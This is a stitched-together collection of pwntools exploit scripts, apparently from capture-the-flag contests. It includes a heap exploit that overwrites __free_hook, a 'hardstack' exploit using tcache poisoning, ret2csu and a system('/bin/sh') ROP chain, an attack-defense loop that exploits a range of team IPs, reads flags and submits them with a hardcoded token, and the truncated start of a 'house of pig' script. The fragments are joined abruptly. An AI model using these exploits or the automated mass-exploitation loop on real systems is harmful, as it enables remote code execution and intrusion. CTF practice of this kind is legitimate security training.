create('n') 
predict(10, '\x00'*0xc8+p64(0x461))
remove(3)
create('n') 
create('n') 
show(4)
r('training data: ')
libc = int(r('\n'),10)-0x1ebbe0
log.info("@ libc: "+hex(libc))
__free_hook = libc+0x1eeb28
log.info("@ __free_hook: "+hex(__free_hook))
system = libc+0x55410 
log.info("@ system: "+hex(system))
one = libc+0xe6c81 
log.info("@ one: "+hex(one))
remove(6)
remove(5)
predict(10, ('\x00'*0x68+p64(0x71)+p64(__free_hook).ljust(0x180,'\x00')))
create('n') 
predict(10, p64(one)+'\x00'*0x50)
p.interactive()
from pwn import *
import requests
# TqBkeptm
local = 1
debug = 1
Timeout.default = 2
libc = ELF('./libc-2.27.so')
if debug == 1:
    context.log_level = 'debug'
def pwn(p):
    def launch_gdb():
        if local != 1:
            return
        context.terminal = ['xfce4-terminal', '-x', 'sh', '-c']
        #print(proc.pidof(p)[0])
        raw_input()
        # gdb.attach(p)
        # gdb.attach(proc.pidof(p)[0])
    def add(i,size):
        p.recvuntil('choice:')
        p.sendline('1')
        p.recvuntil(':')
        p.sendline(str(i))
        p.recvuntil(':')
        p.sendline(str(size))
    def edit(i,d):
        p.recvuntil('choice:')
        p.sendline('2')
        p.recvuntil(':')
        p.sendline(str(i))
        p.recvuntil(':')
        p.sendline(d)
    def show(i):
        p.recvuntil('choice:')
        p.sendline('3')
        p.recvuntil(':')
        p.sendline(str(i))
    def dele(i):
        p.recvuntil('choice:')
        p.sendline('4')
        p.recvuntil(':')
        p.sendline(str(i))
    def stack_over(s):
        payload = 'a' * 0x100 + p64(0x602150) + p64(0x4010a3)+p64(0)*11 +s
        p.recvuntil('choice:')
        p.sendline('666')
        sleep(0.1)
        p.sendline(str(len(payload)))
        sleep(0.1)
        p.send(payload)
    def csu_call(addr,p1,p2,p3):
        payload = p64(0x40113A) 
        payload += p64(0) + p64(1) + p64(addr) + p64(p1) + p64(p2) + p64(p3) + 
p64(0x00401120)
        payload += p64(0) + p64(0xDEADE000 + 0xf00) * 6 + p64(0x400F90)
        return payload
    '''
    00401120                 mov     rdx, r15
.text:0000000000401123                 mov     rsi, r14
.text:0000000000401126                 mov     edi, r13d
.text:0000000000401129                 call    ds:(funcs_401129 - 601D78h)[r12+rbx*8]
.text:000000000040112D                 add     rbx, 1
.text:0000000000401131                 cmp     rbp, rbx
.text:0000000000401134                 jnz     short loc_401120
    40113A                 pop     rbx
.text:000000000040113B                 pop     rbp
.text:000000000040113C                 pop     r12
.text:000000000040113E                 pop     r13
.text:0000000000401140                 pop     r14
.text:0000000000401142                 pop     r15
.text:0000000000401144                 retn
    '''
    add(0,0x400)
    add(1,0x400)
    dele(0)
    dele(1)
    edit(1,p64(0xDEADE000)) 
    add(2,0x400)
    add(3,0x400) # 400C24
    launch_gdb()
    edit(3,p64(0x0000000000000018) + p64(0x40113A)+ 
p64(0x0000000000401079)+p64(0x0000000000400ed3)+'\n')
    stack_over(csu_call(0x601FA0 ,1,0x601FA0,0x10))
    p.recvuntil('\x00\x00')
    leak_lib = u64(p.recv(8))
    log.info(hex(leak_lib))
    base = leak_lib - 1631440
    edit(3,p64(0x0000000000000018) + p64(0x0000000000401143)+ 
p64(0x0000000000401079)+p64(0x0000000000400ed3)+'\n')
    stack_over(p64(0x0000000000401143) + p64(base + next(libc.search('/bin/sh'))) + 
p64(0x0000000000401144) + p64(base + libc.symbols['system']))
ip_list = '172.0.x.12'
port = 0
import sys
import json
try:
    from urllib.parse import urlencode
except ImportError:
    from urllib import urlencode
try:
    import httplib
except ImportError:
    import http.client as httplib
server_host = '10.10.10.1'   # modify this
server_port = 80            # modify this 
def my_submit_flag(flag, team_token = '6DnR5NSdrE36bvGtKWaKX95tq8v23UdbRFCMmwuHeVQEQ', 
host=server_host, port=server_port, timeout=5):
    if not team_token or not flag:
        raise Exception('team token or flag not found')
    conn = httplib.HTTPConnection(host, port, timeout=timeout)
    params = urlencode({
        'token': team_token,
        'flag': flag,
    })
    headers = {
        "Content-type": "application/x-www-form-urlencoded"
    }
    conn.request('POST', '/api/v1/att_def/web/submit_flag/?event_id=10', params, 
headers)
    response = conn.getresponse()
    data = response.read()
    conn.close()
    print(json.loads(data))
    return
if __name__ == '__main__':
    if local == 1:
        # p = process('./hardstack.bak',env = {'LD_PRELOAD':'./libc-2.27.so'})
        p = remote('172.35.13.44',9999)
        pwn(p)
        p.interactive()
    else:
        while True:
            for i in xrange(20):
                try:
                    ip = '172.0.'+str(i+50) + '.12'
                    p = remote(ip,8888)
                    context.log_level = 'info'
                    pwn(p)
                    context.log_level = 'debug'
                    p.sendline('echo kkp && cat flag')
                    # p.interactive()
                    p.recvuntil('kkp\n',timeout=1)
                    flag = p.recvline().strip()
                    print(flag)
                    my_submit_flag(flag)
                    p.close()
                except Exception:
                    continue
house of pig
from pwn import *
a1="A@H@x"
a2="Bhg#l"
a3="C3-hB"
context.log_level="debug"
def cmd(s):
   p.sendlineafter(": ",str(s))
def cmd1(s):
   p.sendafter(": ",str(s))
def add(size,note):
    cmd(1)